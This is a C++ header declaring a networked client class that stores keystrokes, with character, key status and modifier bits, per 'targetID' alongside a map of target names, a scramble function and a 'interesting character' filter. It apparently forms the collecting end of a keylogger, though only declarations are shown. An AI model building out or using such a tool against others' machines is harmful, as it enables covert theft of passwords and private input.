#pragma once

#include <iostream>
#include <mutex>
#include <thread>
#include <unordered_map>

#include "common.h"
#include "kqnet.h"

class client : public kq::client_interface<messageType> {
  public:
    client(uint64_t (*scrambleFunc)(uint64_t));
    ~client();

    void run();
    void print_storage();
    void networkInitAndLoop();

    bool isInterestingChar(char c);
    void process_keys(uint32_t targetID, char character, keyStatus status,
                      uint16_t modifierKeysBitMask);

    class LogEntry {
      public:
        LogEntry(char character, keyStatus status, uint16_t modifierKeysBitMask)
            : character(character), status(status),
              modifierKeysBitMask(modifierKeysBitMask) {}
        char character;
        keyStatus status;
        uint16_t modifierKeysBitMask;
    };

  private:
    std::thread networkingThread;
    bool networkLoop;

    std::unordered_map<uint32_t, std::vector<char>> keyMap;
    std::mutex keyMapMutex;
    std::unordered_map<uint32_t, std::string> nameMap;
};